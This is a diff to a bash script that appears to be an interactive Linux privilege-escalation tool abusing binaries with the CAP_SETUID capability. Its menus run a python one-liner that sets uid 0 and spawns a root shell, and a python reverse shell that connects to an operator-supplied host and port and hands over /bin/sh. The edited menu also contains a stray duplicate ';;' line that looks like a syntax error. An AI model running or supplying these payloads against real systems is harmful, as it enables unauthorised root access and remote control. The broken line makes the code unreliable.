@@ -156,64 +156,87 @@ while true; do
         1)
             echo "----- < Shell (CAP_SETUID Capability) > -----"
             echo " "
+            
             if [ -z "$ShellCap" ]; then
                 echo "No Vulnerables Binaries with Capabilities detected"
                 continue
-            else
-                echo "Availables Binaries to Exploit : "
-                echo " "
-                echo "$ShellCap"
-                echo " "
             fi
 
-            select choice in $ShellCap "Go Back"; do
-                case "$choice" in
-                    *python*)
-                        echo "Trying with python3"
-                        "$choice" -c 'import os; os.setuid(0); os.system("bash")'
-                        ;;
-                    "Go Back")
-                        break
-                        ;;
-                    *)
-                        echo "Invalid Choice, Choose From : "
-                        printf '%s\n' "$ShellCap" | nl -w2 -s') '
-                        ;;
-                esac
-            done               
+            while true; do
+                echo "Choose from the following : "
+                echo " "
+
+                select choice in $ShellCap "Go Back"; do
+                    case "$choice" in
+                        *python*)
+                            echo "Trying with python3"
+                            "$choice" -c 'import os; os.setuid(0); os.system("bash")'
+
+                            read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
+
+                            if [[ "$answer" =~ ^[Yy]$ ]]; then
+                                break
+                            else
+                                break 2
+                            fi
+                            ;;
+
+                            ;;
+                        "Go Back")
+                            break
+                            ;;
+                        *)
+                            echo "Invalid Choice, Choose From : "
+                            printf '%s\n' "$ShellCap" | nl -w2 -s') '
+                            ;;
+                    esac
+                done   
+            done            
             ;;
         2)
             echo "----- < Reverse Shell (CAP_SETUID Capability) > -----"
             echo " "
+            
             read -p "Local Host for receiving the Reverse Shell : " LHOST
             read -p "Local Port for receiving the Reverse Shell : " LPORT
+
             if [ -z "$RevShellCap" ]; then
                 echo "No Vulnerables Binaries with Capabilities detected"
                 continue
-            else
-                echo "Availables Binaries to Exploit : "
-                echo " "
-                echo "$RevShellCap"
-                echo " "
             fi
 
-            select choice in $RevShellCap "Go Back"; do
-                case "$choice" in
-                    *python*)
-                        read -r -p "Set up your listener at $LHOST:$LPORT then press enter"
-                        "$choice" -c 'import sys,socket,os,pty;os.setuid(0);s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
-                        ;;
-                    "Go Back")
-                        break
-                        ;;
-                    *)
-                        echo "Invalid Choice, Choose From : "
-                        printf '%s\n' "$ShellCap" | nl -w2 -s') '
-                        ;;
-                esac
+            while true; do
+                echo "Choose from the following : "
+                echo " "
+
+                select choice in $RevShellCap "Go Back"; do
+                    case "$choice" in
+                        *python*)
+                            
+                            read -r -p "Set up your listener at $LHOST:$LPORT then press enter"
+                            echo "Trying with python3..."
+                            "$choice" -c 'import sys,socket,os,pty;os.setuid(0);s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+                            read -p "Exploit Failed, do you want to try another one ? [y/N] : " answer
+
+                            if [[ "$answer" =~ ^[Yy]$ ]]; then
+                                break
+                            else
+                                break 2
+                            fi
+                            ;;
+
+                        "Go Back")
+                            break
+                            ;;
+                        *)
+                            echo "Invalid Choice, Choose From : "
+                            printf '%s\n' "$RevShellCap" | nl -w2 -s') '
+                            ;;
+                    esac
+                done
             done               
             ;;
-
         3)
             echo "----- < File Read (CAP_DAC_OVERRIDE & CAP_SETUID Capabilities) > -----"
             echo " "
@@ -247,9 +270,10 @@ while true; do
                             fi
                             ;;
                     
-                    "Go Back")
+                        "Go Back")
                             break 2
                             ;;
+                            
                         *)
                             echo "Invalid Choice, Choose From : "
                             printf '%s\n' "$FileReadCap" | nl -w2 -s') '
